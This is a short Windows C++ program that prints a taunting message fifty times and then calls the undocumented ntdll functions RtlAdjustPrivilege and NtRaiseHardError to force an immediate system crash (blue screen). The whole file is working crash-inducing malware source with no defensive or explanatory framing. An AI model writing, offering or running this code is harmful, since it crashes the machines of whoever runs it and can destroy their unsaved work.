#include <Windows.h>
#include <iostream>

#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, BOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);

int main()
{
	BOOLEAN bl;
	unsigned long response;

	for (int i = 0; i < 50; i++)
	{
		std::cout << "HAHA WINDOWS IS BAD!\n";
	}

	RtlAdjustPrivilege(19, true, false, (BOOLEAN)&bl);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
	return 0;
}